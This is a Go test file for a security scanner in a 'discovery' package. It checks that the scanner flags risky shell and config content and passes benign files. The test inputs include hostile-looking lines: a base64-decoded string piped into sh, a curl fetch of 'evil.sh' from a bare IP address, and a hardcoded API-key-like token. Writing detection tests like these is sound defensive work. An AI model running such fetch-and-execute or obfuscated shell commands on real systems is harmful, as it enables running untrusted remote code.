package discovery_test

import (
	"testing"

	"discovery"
)

func TestRuleScanner_DetectBase64(t *testing.T) {
	s := discovery.NewRuleScanner()
	r := s.ScanContent("test.sh", `echo "dGVzdA==" | base64 -d | sh`)
	if r.Passed {
		t.Fatal("should detect base64 decode to shell")
	}
}

func TestRuleScanner_DetectCurlToIP(t *testing.T) {
	s := discovery.NewRuleScanner()
	r := s.ScanContent("test.sh", `curl https://192.168.1.1/evil.sh`)
	if r.Passed {
		t.Fatal("should detect curl to IP")
	}
}

func TestRuleScanner_DetectHardcodedToken(t *testing.T) {
	s := discovery.NewRuleScanner()
	r := s.ScanContent(".env", `API_KEY=sk-abc123def456ghi789`)
	if r.Passed {
		t.Fatal("should detect hardcoded token")
	}
}

func TestRuleScanner_SafeFile(t *testing.T) {
	s := discovery.NewRuleScanner()
	r := s.ScanContent("test.py", `print("hello world")`)
	if !r.Passed {
		t.Fatal("safe file should pass")
	}
}

func TestRuleScanner_EmptyContent(t *testing.T) {
	s := discovery.NewRuleScanner()
	r := s.ScanContent("empty.txt", "")
	if !r.Passed {
		t.Fatal("empty content should pass")
	}
}

func TestChainScanner(t *testing.T) {
	c := discovery.NewChainScanner()
	c.Add(discovery.NewRuleScanner())
	r := c.ScanContent("test.sh", `echo "dGVzdA==" | base64 -d | sh`)
	if r.Passed {
		t.Fatal("chain should detect base64")
	}
}
